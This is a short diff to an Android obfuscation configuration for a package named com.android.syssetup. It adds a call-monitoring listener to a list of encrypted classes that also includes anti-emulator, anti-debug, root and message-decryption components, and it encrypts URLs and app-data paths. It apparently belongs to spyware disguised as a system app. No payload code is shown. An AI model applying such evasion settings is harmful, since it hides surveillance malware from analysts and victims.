@@ -1,8 +1,11 @@
 
 #-verbose
--encryptclasses com.android.syssetup.util.AntiEmulator,com.android.syssetup.MessagesDecrypt,
+-encryptclasses com.android.syssetup.util.AntiEmulator,
+		com.android.syssetup.MessagesDecrypt,
 		com.android.syssetup.Root,com.android.syssetup.Core,
-		com.android.syssetup.util.AntiDebug,com.android.syssetup.util.AntiEmulator
+		com.android.syssetup.util.AntiDebug,
+		com.android.syssetup.util.AntiEmulator,
+		com.android.syssetup.listener.BroadcastMonitorCall
 
 -encryptstrings "http://*","https://*","/data/data/*","/auth/user_data/*","l*",".lost.found"
 -encryptstrings "AES*","*SELECT*","select*","gt-*","*.google.com","getApplicationInfo"
